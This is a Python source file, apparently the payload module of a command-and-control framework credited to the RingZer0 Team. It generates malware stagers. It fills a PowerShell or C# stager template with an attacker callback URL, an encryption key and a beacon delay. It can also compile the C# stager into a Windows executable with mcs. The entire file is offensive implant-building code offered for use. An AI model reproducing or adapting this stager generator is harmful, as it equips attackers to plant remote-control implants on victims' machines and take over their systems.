#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/payload.py
"""

import os
from core.utils import Utils


class Payload:

    DEFAULT_DELAY = 10000
    DEFAULT_TYPE = 'ps'

    def __init__(self, config):
        self.config = config
        self.type = {}
        self.type['ps'] = 'stager.ps1'

        # self.type["js"] = "stager.ps1"
        # self.type["hta"] = "stager.ps1"

        self.type['exe'] = '../bin/stager.cs'
        self.type['cs'] = '../bin/stager.cs'

        self.delay = Payload.DEFAULT_DELAY
        self.option = Payload.DEFAULT_TYPE

    def set_type(self, type):
        if type in self.type:
            self.option = type

    def set_delay(self, delay):
        try:
            self.delay = int(delay)
        except:
            self.delay = Payload.DEFAULT_DELAY

    def get_output(self):
        output = Utils.load_powershell_script(self.type[self.option], 200)
        output = output.replace('[URL]', self.get_url()).replace('[KEY]', self.config.get('encryption-key')).replace('[DELAY]', str(self.delay))
        if self.option == 'exe':
            output = self.compile_exe(output)
        return output

    def compile_exe(self, data):
        output = ''
        filename = '/tmp/%s' % Utils.gen_str(10)
        open(filename, 'wb+').write(data)
        cmdline = \
            'mcs %s -out:%s.exe -r:bin/System.Management.Automation.dll -r:bin/System.Web.Extensions.dll -r:bin/System.Windows.Forms.dll > /dev/null 2>&1' \
            % (filename, filename)

        os.system(cmdline)
        output = open('%s.exe' % filename, 'rb').read()
        os.remove(filename)
        os.remove('%s.exe' % filename)

        return output

    def get_url(self):
        url = 'http://'
        if self.config.get('https-enabled') == 'on':
            url = 'https://'
        url += '%s/' % (self.config.get('payload-callback'))
        self.config.set('payload-callback', "%s:%s" % (self.config.get('http-fqdn'), self.config.get('http-port')))
        return url
